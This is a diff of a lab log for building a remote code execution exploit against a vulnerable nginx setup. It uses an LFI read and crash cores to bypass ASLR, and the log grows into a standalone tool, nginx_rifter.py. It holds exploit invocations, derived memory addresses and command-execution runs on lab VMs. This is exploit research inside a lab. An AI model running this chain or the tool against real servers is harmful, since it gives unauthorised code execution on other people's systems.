@@ -55,7 +55,7 @@ Last updated: 2026-05-15 05:32:17 CEST
 - The CTF entrypoints leave `randomize_va_space` untouched; LFI showed `/proc/sys/kernel/randomize_va_space` as `2`.
 - `/proc/<nginx-worker>/personality` showed `00000000`, not `ADDR_NO_RANDOMIZE`.
 - Despite that, nginx/libc mappings appeared fixed across restarts on this host.
-- Explanation: Docker Desktop is running an amd64 container under emulation on an arm64 host. Do not over-interpret fixed-looking addresses from this lab host as normal Linux ASLR behavior.
+- Explanation: non-native Docker is running an amd64 container under emulation on an arm64 host. Do not over-interpret fixed-looking addresses from this lab host as normal Linux ASLR behavior.
 
 ### Core-Dump Observation
 
@@ -105,17 +105,17 @@ Last updated: 2026-05-15 05:32:17 CEST
 
 ### Native Architecture Track Decision
 
-- User asked whether switching to ARM would help, then suggested a real Ubuntu VM through Vagrant on the `Ultra` ESXi host.
+- User asked whether switching to ARM would help, then suggested a real Ubuntu VM through Vagrant on a lab x86_64 hypervisor.
 - Decision: stay x86_64 and use Vagrant for the realism track.
 - Rationale:
-  - ARM64 removes Docker Desktop amd64 emulation artifacts but invalidates the original x86_64 PoC heap candidates and changes libc/codegen/layout.
-  - A real x86_64 Ubuntu VM removes the Docker Desktop emulation caveat while preserving the architecture the PoC was tuned for.
+  - ARM64 removes non-native amd64 Docker runtime artifacts but invalidates the original x86_64 PoC heap candidates and changes libc/codegen/layout.
+  - A real x86_64 Ubuntu VM removes the non-native Docker emulation caveat while preserving the architecture the PoC was tuned for.
 - An ARM64 overlay briefly built during exploration, then the lab was returned to the x86_64 same-port CTF image and the ARM overlay was removed from the branch.
 
 ### Vagrant ESXi Attempt 1
 
 - Added `Vagrantfile`, `vagrant/provision.sh`, and `docs/VAGRANT_ESXI.md`.
-- Confirmed `root@ultra.home` SSH key authentication works.
+- Confirmed hypervisor SSH key authentication works.
 - Confirmed `vagrant validate` succeeds when an ESXi password spec is syntactically available.
 - Ran `vagrant up --provider=vmware_esxi`.
 - Vagrant downloaded `generic/ubuntu2204` VMware box and started the ESXi build.
@@ -125,15 +125,15 @@ Last updated: 2026-05-15 05:32:17 CEST
 
 ### Vagrant ESXi Launch And Manual Provision
 
-- User clarified that the password prompt was intended for `ovftool` operations, not SSH to `Ultra`.
-- Kept SSH to `root@ultra.home` key-based and used a hidden macOS prompt only to populate `ESXI_PASSWORD` for the Vagrant/`ovftool` path.
+- User clarified that the password prompt was intended for `ovftool` operations, not SSH to `a lab hypervisor`.
+- Kept provider SSH key-based and provided the `ovftool` password through an environment-backed prompt.
 - Launched the VM through `vagrant up --provider=vmware_esxi`.
-- ESXi created VMID `24` with guest IP `192.168.1.205`.
-- Vagrant provider guest communication did not complete cleanly, but direct Vagrant-key SSH to `vagrant@192.168.1.205` worked.
+- ESXi created a VM with guest IP `<target-host>`.
+- Vagrant provider guest communication did not complete cleanly, but direct Vagrant-key SSH to `vagrant@<target-host>` worked.
 - Synced the repo manually to `/vagrant` and ran `sudo bash /vagrant/vagrant/provision.sh`.
 - Provisioning installed/build the nginx target, PHP-FPM, same-port LFI/phpinfo routes, and systemd services.
 - Smoke test passed:
-  - `http://192.168.1.205:19321/` returned `ok`.
+  - `http://<target-host>:19321/` returned `ok`.
   - PHP-FPM LFI `/proc/self/status` showed UID/GID `65534`.
   - `/proc/sys/kernel/randomize_va_space` returned `2`.
   - guest architecture is `x86_64`.
@@ -159,7 +159,7 @@ Last updated: 2026-05-15 05:32:17 CEST
 ### VM Core-Guided Attempt 1
 
 - Patched `ctf_remote_exploit.py` so core-guided mode can generate a probe core using URI-safe bogus address `0x303030303030` when the current ASLR layout has no legacy URI-safe candidates.
-- Ran `./ctf_remote_exploit.py --host 192.168.1.205 --port 19321 --core-guided --tries-per-candidate 2 --proof-delay 0.25 --verbose`.
+- Ran `./ctf_remote_exploit.py --host <target-host> --port 19321 --core-guided --tries-per-candidate 2 --proof-delay 0.25 --verbose`.
 - The driver derived over HTTP:
   - nginx worker PID,
   - nginx writable image mapping,
@@ -242,18 +242,18 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Next geometry control should tune `large_client_header_buffers` and request sequencing with live debugging, not only `plus_count`.
 - Tested `large_client_header_buffers 4 16384`; the transition still occurred after the stable `plus_count=2600` path. The cleanup-bearing victim pool disappeared from recognizable core scans for larger plus counts.
 - Current partial-overwrite blocker: a non-NULL cleanup pointer exists, but the accessible overflow geometry reaches nearby request/pool memory, not the cleanup pointer field itself.
-- Correction: no second clone VM has been created yet. All ESXi VM tests so far used the single VM at `192.168.1.205`. A separate clone/twin VM must be created before using live debugger output as non-target oracle data.
+- Correction: no second clone VM has been created yet. All ESXi VM tests so far used the single VM at `<target-host>`. A separate clone/twin VM must be created before using live debugger output as non-target oracle data.
 
 ## 2026-05-15
 
 ### Debug Twin VM
 
 - User fixed the ESXi NIC/port-group issue.
-- Created/provisioned a separate debug/twin VM at `192.168.1.89:19321` for live-debugging and layout experiments.
-- Kept the original target VM at `192.168.1.205:19321` as the CTF target.
+- Created/provisioned a separate debug/twin VM at `<debug-host>:19321` for live-debugging and layout experiments.
+- Kept the original target VM at `<target-host>:19321` as the CTF target.
 - Installed `gdb` and set `kernel.yama.ptrace_scope=0` only on the debug/twin VM.
 - Added `debug/gdb_trace_request.gdb` to trace request allocations, rewrite copy positions, cleanup registration, request freeing, and pool destruction.
-- Rule clarification: gdb and direct SSH-derived offsets from `192.168.1.89` are allowed for source/layout understanding, but target exploitation against `192.168.1.205` must still use HTTP/LFI primitives or version/distro facts.
+- Rule clarification: gdb and direct SSH-derived offsets from `<debug-host>` are allowed for source/layout understanding, but target exploitation against `<target-host>` must still use HTTP/LFI primitives or version/distro facts.
 
 ### Slot-Scan Core Probe
 
@@ -337,11 +337,11 @@ Last updated: 2026-05-15 05:32:17 CEST
   - `a_count=128`, `plus_count=962` reached the HTTP/2 connection pool but left the overwrite one byte misaligned.
   - `a_count=127`, `plus_count=962` aligned the low-2-byte partial overwrite on `pool->cleanup`.
 - Debug clone win:
-  - command: `./ctf_remote_exploit.py --host 192.168.1.89 --port 19321 --core-guided --target-len 2 --h2-victim --a-count 127 --plus-count 962 --tries-per-candidate 1 --max-core-hits 100 --proof-delay 0.25 --core-delay 2 --verbose`
+  - command: `./ctf_remote_exploit.py --host <debug-host> --port 19321 --core-guided --target-len 2 --h2-victim --a-count 127 --plus-count 962 --tries-per-candidate 1 --max-core-hits 100 --proof-delay 0.25 --core-delay 2 --verbose`
   - result: recovered one corrupted/probe pool and matched safe h2-body slots in the same 64 KiB window.
   - first final candidate executed the marker command and was verified through LFI.
 - Target VM win:
-  - deployed the updated branch lab config to `192.168.1.205` as lab setup.
+  - deployed the updated branch lab config to `<target-host>` as lab setup.
   - ran the same command against the target VM, using only HTTP/LFI facts during exploitation.
   - target facts derived remotely included worker PID `15474`, nginx rw mapping `0x562f58677000`, libc base `0x7fca6acfa000`, and `system()` `0x7fca6ad4ad70`.
   - probe found `1` corrupted/probe pool with cleanup `0x562f58b23030`.
@@ -358,7 +358,7 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Added `demo_ctf_exploit_v1_1.py` as a separate runner, preserving the known-good exploit and demo scripts.
 - v1.1 adds remote preflight checks, PID-correlated core parsing, nonce freshness checks, bounded geometry auto-calibration, structured JSON artifacts, and candidate ranking against corrupted/probe cleanup pools.
 - Fixed v1.1 reset behavior so a non-base calibrated geometry is also used for the pre-final reset crash.
-- Validated v1.1 on target VM `192.168.1.205`:
+- Validated v1.1 on target VM `<target-host>`:
   - ASLR remained enabled with `randomize_va_space=2`.
   - pre-probe worker PID `2394` matched the core PID.
   - probe core contained `1010` URI-safe slots out of `10437`.
@@ -366,7 +366,7 @@ Last updated: 2026-05-15 05:32:17 CEST
   - artifact: `artifacts/demo_v1_1_20260515-050301.json`.
 - Added `demo_ctf_exploit_v1_2.py` as the next minor-version runner.
 - v1.2 adds remote OS/kernel fingerprinting, git/argv artifact metadata, pre-reset worker PID capture, reset-core re-scanning, strict `--require-reset-core` mode, and worker-recovery waits between failed final candidates.
-- Validated v1.2 with `--require-reset-core` on target VM `192.168.1.205`:
+- Validated v1.2 with `--require-reset-core` on target VM `<target-host>`:
   - pre-probe worker PID `2473` matched the first core.
   - pre-reset worker PID `2474` matched the reset core.
   - reset core contained `1204` URI-safe slots out of `10437`.
@@ -376,14 +376,14 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Current preferred recording command:
 
 ```bash
-./demo_ctf_exploit_v1_2.py --host 192.168.1.205 --port 19321 --clear --require-reset-core
+./demo_ctf_exploit_v1_2.py --host <target-host> --port 19321 --clear --require-reset-core
 ```
 
 ### Continued Demo PoC Improvement Pass
 
 - Added `demo_ctf_exploit_v1_3.py`.
 - v1.3 re-derives target facts before each calibration probe, records target snapshots, enforces strict core PID matching by default, and checks pre-reset/final layout stability for nginx image, libc, and `system()`.
-- Validated v1.3 on target VM `192.168.1.205`:
+- Validated v1.3 on target VM `<target-host>`:
   - initial worker PID `2602`.
   - reset core PID `2604` matched the expected pre-reset worker.
   - reset core contained `928` URI-safe slots out of `10437`.
@@ -392,7 +392,7 @@ Last updated: 2026-05-15 05:32:17 CEST
   - artifact: `artifacts/demo_v1_3_20260515-051328.json`.
 - Added `demo_ctf_exploit_v1_4.py`.
 - v1.4 adds strict preflight checks for ASLR/core/nginx topology and filters impossible final candidates before trying them.
-- Validated v1.4 on target VM `192.168.1.205`:
+- Validated v1.4 on target VM `<target-host>`:
   - strict preflight passed with ASLR enabled, `core_pattern=core`, `suid_dumpable=2`, and one nginx worker.
   - reset core PID `2681` matched the expected worker.
   - candidate sanity filter kept `45` candidates and dropped `0`.
@@ -400,7 +400,7 @@ Last updated: 2026-05-15 05:32:17 CEST
   - artifact: `artifacts/demo_v1_4_20260515-051517.json`.
 - Added `demo_ctf_exploit_v1_5.py`.
 - v1.5 adds bounded campaign mode with `--rounds` and per-round artifact records.
-- Validated v1.5 with `--rounds 2` on target VM `192.168.1.205`:
+- Validated v1.5 with `--rounds 2` on target VM `<target-host>`:
   - round 1 reset core PID `2759` matched the expected worker.
   - reset core contained `928` URI-safe slots out of `10437`.
   - candidate sanity filter kept `166` candidates and dropped `0`.
@@ -410,7 +410,7 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Current preferred recording command:
 
 ```bash
-./demo_ctf_exploit_v1_5.py --host 192.168.1.205 --port 19321 --clear --require-reset-core --rounds 2
+./demo_ctf_exploit_v1_5.py --host <target-host> --port 19321 --clear --require-reset-core --rounds 2
 ```
 
 ### v1.6 Reliability And Research Features
@@ -434,13 +434,13 @@ Last updated: 2026-05-15 05:32:17 CEST
   - strict core PID matching remains the primary evidence gate.
 - Added `summarize_demo_artifacts.py` to summarize JSON artifacts.
 - Added `known_layout_patterns.json` and `docs/KNOWN_LAYOUT_PATTERNS.md` as a seed reliability knowledge base. This is explicitly a hint source, not a replacement for live ASLR derivation.
-- Validated v1.6 negative path on target VM `192.168.1.205`:
+- Validated v1.6 negative path on target VM `<target-host>`:
   - reset core PID `2850` matched the expected worker.
   - reset core contained `1010` URI-safe slots out of `10437`.
   - candidate sanity filter kept `160` candidates and dropped `6`.
   - bad candidate `0x303030303030` produced no marker proof.
   - artifact: `artifacts/demo_v1_6_20260515-053017.json`.
-- Validated v1.6 arbitrary command execution and fingerprinting on target VM `192.168.1.205`:
+- Validated v1.6 arbitrary command execution and fingerprinting on target VM `<target-host>`:
   - nginx build ID `060e053ab1fa1a2876b7fe0ff4eff0cc777857b6`, SHA-256 `14bebe8937678598b8ebb8449f8c155478a4c49894c9467ce51d54a79352f08f`.
   - libc build ID `095c7ba148aeca81668091f718047078d57efddb`, SHA-256 `c53819710b163d3f1d2541778590d58d3ef31cb0ed75adcbe059faac68c1e72d`.
   - reset core PID `2913` matched the expected worker.
@@ -451,7 +451,7 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Current preferred recording command:
 
 ```bash
-./demo_ctf_exploit_v1_6.py --host 192.168.1.205 --port 19321 --clear --require-reset-core --rounds 2 --exec-cmd id
+./demo_ctf_exploit_v1_6.py --host <target-host> --port 19321 --clear --require-reset-core --rounds 2 --exec-cmd id
 ```
 
 ### v1.7/v1.8 Demo Runner Pass
@@ -460,7 +460,7 @@ Last updated: 2026-05-15 05:32:17 CEST
   - `--cmd` is the default command-capture path,
   - reset-core use, binary fingerprinting, cleanup, strict preflight, and two exploit rounds are selected by default,
   - command output is printed as the final terminal section with wrapping/truncation.
-- Validated v1.7 on target VM `192.168.1.205`:
+- Validated v1.7 on target VM `<target-host>`:
   - OS `Ubuntu 22.04.3 LTS`, nginx `1.31.0`, PHP `8.1.2-1ubuntu2.23`, libc `2.35-0ubuntu3.13`,
   - nginx build ID `060e053ab1fa1a2876b7fe0ff4eff0cc777857b6`,
   - libc build ID `095c7ba148aeca81668091f718047078d57efddb`,
@@ -473,11 +473,11 @@ Last updated: 2026-05-15 05:32:17 CEST
   - CVE/bug/fixed-release context in help and start banner,
   - modular HTTP file-read adapter with a default query-param vector and a custom `--file-read-template`,
   - `--target-profile generic` for non-lab CTF apps where this fork's nginx config assertions should not apply.
-- Smoke-tested the file-read adapter against `192.168.1.205`:
+- Smoke-tested the file-read adapter against `<target-host>`:
   - default query-param adapter read `randomize_va_space=2`,
   - template adapter `http://{host}:{port}/lfi.php?file={path_url}{range_query}` read `randomize_va_space=2`.
 - Validated v1.8 compact mode on target VM:
-  - command: `./demo_ctf_exploit_v1_8.py --host 192.168.1.205 --cmd 'id; uname -a; seq 1 20' --fast --artifact-dir artifacts`,
+  - command: `./demo_ctf_exploit_v1_8.py --host <target-host> --cmd 'id; uname -a; seq 1 20' --fast --artifact-dir artifacts`,
   - selected geometry `A=127`, `plus=962`,
   - fresh reset core produced `60` candidates before final filtering,
   - first winning address `0x55e4210b2127`, body offset `1376`,
@@ -490,7 +490,7 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Current preferred recording command:
 
 ```bash
-./demo_ctf_exploit_v1_8.py --host 192.168.1.205 --port 19321 --cmd id --clear
+./demo_ctf_exploit_v1_8.py --host <target-host> --port 19321 --cmd id --clear
 ```
 
 ### v1.9 Command Output Rendering
@@ -510,7 +510,7 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Validated command:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd 'ls -la /app/tmp' --fast --artifact-dir artifacts --phpinfo-path ''
+./demo_ctf_exploit_v1_9.py --host <target-host>:19321 --cmd 'ls -la /app/tmp' --fast --artifact-dir artifacts --phpinfo-path ''
 ```
 
 - Observed:
@@ -521,13 +521,13 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Current preferred recording command:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd id --clear
+./demo_ctf_exploit_v1_9.py --host <target-host>:19321 --cmd id --clear
 ```
 
 - Validated `HOST:PORT` parsing in a live exploit run:
 
 ```bash
-./demo_ctf_exploit_v1_9.py --host 192.168.1.205:19321 --cmd id --fast --rounds 1 --artifact-dir artifacts --phpinfo-path ''
+./demo_ctf_exploit_v1_9.py --host <target-host>:19321 --cmd id --fast --rounds 1 --artifact-dir artifacts --phpinfo-path ''
 ```
 
 - Observed:
@@ -548,11 +548,11 @@ Last updated: 2026-05-15 05:32:17 CEST
   - nginx config discovery from master cmdline plus common paths,
   - vulnerable `rewrite` + `set` route candidate detection,
   - exploit-chain viability matrix.
-- `--exploit --cmd ...` is explicit and hands off to the tested `demo_ctf_exploit_v1_9.py` path after assessment.
+- `--exploit --cmd ...` is explicit. Older v2 builds handed off to `demo_ctf_exploit_v1_9.py`; the current build integrates that path directly in `nginx_rifter.py`.
 - Validated default assessment:
 
 ```bash
-./nginx_rifter.py --target 192.168.1.205:19321 --artifact-dir artifacts --no-color --output artifacts/nginx_rifter_20260515-v2-final.json
+./nginx_rifter.py --target <target-host>:19321 --artifact-dir artifacts --no-color --output artifacts/nginx_rifter_20260515-v2-final.json
 ```
 
 - Observed:
@@ -567,15 +567,77 @@ Last updated: 2026-05-15 05:32:17 CEST
 - Validated template-backed assessment:
 
 ```bash
-./nginx_rifter.py --target 192.168.1.205:19321 \
+./nginx_rifter.py --target <target-host>:19321 \
   --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}' \
   --artifact-dir artifacts --no-color --output artifacts/nginx_rifter_20260515-v2-template.json
 ```
 
-- Validated explicit exploit handoff:
+- Validated explicit exploit mode:
 
 ```bash
-./nginx_rifter.py --target 192.168.1.205:19321 --artifact-dir artifacts --no-color --exploit --cmd id --fast --exploit-rounds 1 --phpinfo-path ''
+./nginx_rifter.py --target <target-host>:19321 --artifact-dir artifacts --no-color --exploit --cmd id --fast --exploit-rounds 1 --phpinfo-path ''
 ```
 
-- Observed handoff artifact: `artifacts/nginx_rifter_20260515-063534.json`; exploit artifact: `artifacts/demo_v1_9_20260515-063534.json`.
+- Historical v2 behavior wrote a rifter assessment artifact and a separate demo exploit artifact; current `nginx_rifter.py` writes exploit derivation and runtime state into the same selected artifact.
+
+### v2.1 Self-Contained Rifter Refactor
+
+- Refactored `nginx_rifter.py` so it no longer imports or shells out to prior PoC/demo scripts:
+  - removed imports from `demo_ctf_exploit_v1_9.py`, `ctf_remote_exploit.py`, and `poc.py`,
+  - inlined the HTTP file-read adapter, nginx worker discovery, ELF/libc symbol parsing, fingerprint helpers, HTTP/2 probe, spray/trigger helpers, and core slot/pool scanners,
+  - replaced the previous `demo_ctf_exploit_v1_9.py` subprocess bridge with an integrated exploit path that reuses the same target adapter and artifact file.
+- Kept default behavior assessment-first. `--exploit --cmd ...` is still explicit, and `--derive-only` now validates the integrated exploit discovery path without sending crash probes.
+- Docker verification was used when the VM lab was unavailable:
+  - assessment path passed against `127.0.0.1:19321`,
+  - template-backed file-read path passed,
+  - integrated `--derive-only` passed and recorded exploit derivation metadata in the artifact,
+  - bounded integrated exploit smoke test generated a crash/core, parsed core program headers, and exercised slot/pool scanning.
+- Docker realism note:
+  - the Docker LFI topology models the common same-host nginx/PHP-FPM plus web-file-read scenario,
+  - it is not being modified to fake the Vagrant proof conditions,
+  - the successful ASLR-bypass chain still depends on a readable nginx worker crash core, which is not a default Ubuntu/nginx production assumption.
+
+Validation commands:
+
+```bash
+python3 -m py_compile nginx_rifter.py
+
+./nginx_rifter.py --target 127.0.0.1:19321 --no-color \
+  --artifact-dir artifacts \
+  --output artifacts/nginx_rifter_selfcontained_docker_assess.json
+
+./nginx_rifter.py --target 127.0.0.1:19321 \
+  --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}' \
+  --no-color --artifact-dir artifacts \
+  --output artifacts/nginx_rifter_selfcontained_docker_template.json
+
+./nginx_rifter.py --target 127.0.0.1:19321 --exploit --derive-only \
+  --cmd id --no-color --phpinfo-path '' \
+  --artifact-dir artifacts \
+  --output artifacts/nginx_rifter_selfcontained_docker_derive2.json
+```
+
+Bounded smoke command:
+
+```bash
+docker compose -f env/docker-compose.yml -f env/docker-compose.lfi.yml exec -T nginx rm -f /app/tmp/core
+
+timeout 90 ./nginx_rifter.py --target 127.0.0.1:19321 \
+  --exploit --cmd id --no-color --phpinfo-path '' \
+  --artifact-dir artifacts \
+  --output artifacts/nginx_rifter_selfcontained_docker_exploit_smoke.json \
+  --exploit-rounds 1 --no-auto-calibrate --max-slot-hits 1 \
+  --max-cleanup-pools 1 --max-core-hits 1 --core-delay 1 --cleanup-delay 0
+```
+
+Observed bounded smoke result:
+
+```text
+probe crash observed: True
+core load segments: 37
+slot hits: 0 URI-safe / 1 total
+cleanup pools: 1
+probe/corrupt pools: 1
+matched candidates: 0
+exhausted integrated exploit candidates without marker proof
+```
